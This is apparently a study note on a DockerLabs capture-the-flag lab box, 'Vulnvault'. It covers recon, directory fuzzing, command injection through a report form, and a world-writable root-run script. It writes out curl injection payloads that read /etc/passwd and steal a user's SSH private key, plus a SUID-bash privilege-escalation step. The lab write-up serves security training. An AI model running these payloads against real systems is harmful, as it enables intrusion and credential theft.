---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, gobuster, curl, ssh]
techniques: [information-gathering, directory-fuzzing, command-injection, cron-job-abuse]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[psycho]]", "[[baluhome]]", "[[acme]]"]
---

# Vulnvault

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/vulnvault.md)

A "Generador de Reportes" whose report form feeds a shell — but the injection is never used for a shell: it's used as a **file reader** to steal samara's private key outright. Root then comes from a `while true` loop in PID 1 hammering a **world-writable** `echo.sh`.

## Path

1. **Recon** — `ping` + `nmap -p- --open -sS --min-rate 5000` → **22** (OpenSSH 9.6p1 **Ubuntu**) + **80** (Apache 2.4.58 Ubuntu, title *"Generador de Reportes - Centro de Operaciones"*) ([[information-gathering]]).
2. **Dir fuzzing** — gobuster (DirBuster-medium + `php,html,txt`) → `index.php` (200, 2832), `upload.html` (200, 2314), `upload.php` (200, **33**), `old/` (301), `server-status` (403) ([[directory-fuzzing]]).
3. **Command injection** — `index.php` has a report form (`nombre`, `fecha`); the first field goes straight to a shell and the *output comes back in the response* (non-blind — `| grep` pulls it out):

   ```sh
   curl -s -X POST http://172.17.0.2/index.php --data "nombre=; whoami" --data "fecha=test" | grep www-data
   curl -s -X POST http://172.17.0.2/index.php --data "nombre=; cat /etc/passwd" --data "fecha=test" | grep /bin/bash
   # → root, samara (1001)
   ```

   ([[command-injection]]).
4. **RCE used as a file reader** — instead of a reverse shell, read what you came for:

   ```sh
   … "nombre=; ls -l /home/samara/.ssh/"   # id_rsa, 3389 B
   … "nombre=; cat /home/samara/.ssh/id_rsa"   # full private key out through the response
   ```

   Heredoc it to `id_rsa_samara`, **`chmod 600`** (ssh rejects open-permission keys), `ssh samara@172.17.0.2 -i id_rsa_samara` ([[ssh]], cf. [[psycho]]'s LFI→key).
5. **User flag** — `cat user.txt` in samara's home (captured; not transcribed here).
6. **Privesc** — `ps -ef | grep root` hands over the whole attack surface in PID 1's command line:

   ```
   /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
   ```

   → `ls -l /usr/local/bin/echo.sh` → **`-rwxrw-rw-`** (world-writable, `o+w`) → overwrite it with a privilege-granting payload, let the loop execute it as root → `/bin/bash -p` → **`root`** → `/root/root.txt` captured (not transcribed) ([[cron-job-abuse]], [[suid-enumeration]]).

## Credentials / secrets

| Secret | Where it came from |
|--------|--------------------|
| samara's passphraseless `id_rsa` | stolen through the `nombre` injection (`cat`), not a shell |
| root via SUID bash | world-writable `echo.sh` + PID 1's loop → `/bin/bash -p` |

## Takeaways

- **RCE doubles as a file reader.** The injection's first use was `cat id_rsa`, not a reverse shell: no listener, no base64 encoding, the output already prints in the response — and the stolen key **outlives the connection**. Pop a shell only when you need interactivity; here the second stage never needed one ([[command-injection]]).
- **`chmod 600` on every stolen key.** The writeup does this step explicitly — ssh *refuses* keys with group/world-readable perms, so a forgotten chmod fails with a permission error that looks like a wrong key.
- **`ps -ef` is privesc enumeration.** PID 1's full command line *was* the vulnerability map: a `while true` loop executing `echo.sh`. What root **does** is a list of files you should `ls -l` — process list first, permissions second ([[cron-job-abuse]]).
- **World-writable beats group-writable.** `-rwxrw-rw-` (`o+w`) needs no group membership — every previous writable-script box in the vault required the right group ([[baluhome]], [[balulero]]); this one is open to *everyone*, so the `ls -l` bit check (does the mode end in `w`?) is the whole exploit prep.
- **A loop collapses the "wait".** Cron abuse's step 3 is "wait for the next run" — PID 1's tight loop re-runs the script constantly, so the payload executes in milliseconds. The payload shape that fits this endgame is a **privilege grant** (`chmod u+s /bin/bash`) consumed immediately by `/bin/bash -p` (preserve euid), not a reverse shell ([[acme]]'s SUID-shell endgame).

## Gaps in the writeup

- **The `echo.sh` payload was never shown.** The transcript jumps from `ls -l` straight to `/bin/bash -p` → root — but `-p` only preserves euid if bash is SUID, so *something* was written into `echo.sh` (almost certainly a `chmod u+s` style grant) and the wait for the loop happened off-record. The box's actual exploit line is missing from its own writeup.
- **Three of five fuzz hits were never visited.** `upload.html` (2314 B), `upload.php` (200, 33 B), and `old/` (301) were enumerated then abandoned — there's a whole *upload* surface on a box named "Vuln**Vault**" that the injection made unnecessary but nobody checked. What was `upload.php` for?
- **`fecha` was never tested** — only `nombre` injected. The second parameter is unverified (sanitized? second sink?).
- **`server-status` (403) unprobed** — the recurring blind spot.
- `echo.sh`'s *purpose* was never read (the script is 82 bytes and world-readable — its contents would show what the report generator actually does).
